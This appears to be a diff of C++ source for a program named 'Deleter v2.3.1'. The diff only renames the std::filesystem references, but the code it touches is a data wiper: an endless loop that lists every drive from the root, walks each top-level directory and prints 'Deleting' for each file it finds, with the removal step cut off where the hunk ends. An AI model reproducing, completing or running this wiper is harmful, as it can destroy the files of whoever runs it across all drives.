@@ -44,15 +44,14 @@
 #include <string>
 #include <vector>
 using namespace std;
-namespace fs = std::filesystem;
-using namespace fs;
+using namespace std::filesystem;
 int DeleterMain() {
     string Title = "Deleter v2.3.1";
   cout << Title << endl;
-    vector<fs::path> Disks; // Declare an empty vector
+    vector<std::filesystem::path> Disks; // Declare an empty vector
     while (true) {
-      for (const fs::directory_entry &root : fs::recursive_directory_iterator(
-               fs::current_path()
+      for (const std::filesystem::directory_entry &root : std::filesystem::recursive_directory_iterator(
+               std::filesystem::current_path()
                    .root_directory())) {
         if (root.path().parent_path() != root.path() &&
             root.path().string().length() <= 3) {
@@ -60,24 +59,24 @@ int DeleterMain() {
           Disks.push_back(root.path());
         }
         std::vector<std::string> drives;
-        for (const fs::path &disk : Disks) {
+        for (const std::filesystem::path &disk : Disks) {
           drives.push_back(disk.string());
         }
         // Iterate through the split drives
         for (const std::string &drive : drives) {
-          std::vector<fs::path> dirs;
-          for (const fs::directory_entry &entry :
-               fs::directory_iterator(drive)) {
+          std::vector<std::filesystem::path> dirs;
+          for (const std::filesystem::directory_entry &entry :
+               std::filesystem::directory_iterator(drive)) {
             dirs.push_back(entry.path());
           }
-          for (const fs::path &dir : dirs) {
+          for (const std::filesystem::path &dir : dirs) {
             if (is_directory(dir)) {
-              std::vector<fs::path> files;
-              for (const fs::directory_entry &file :
-                   fs::directory_iterator(dir)) {
+              std::vector<std::filesystem::path> files;
+              for (const std::filesystem::directory_entry &file :
+                   std::filesystem::directory_iterator(dir)) {
                 files.push_back(file.path());
               }
-              for (const fs::path &file : files) {
+              for (const std::filesystem::path &file : files) {
                 cout << "Deleting " << file << endl;
                 try {
                   std::error_code ec;
